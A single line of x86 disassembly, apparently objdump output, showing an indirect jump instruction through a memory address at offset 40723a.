  40723a:	ff 25 9c 82 40 00    	jmp    *0x40829c
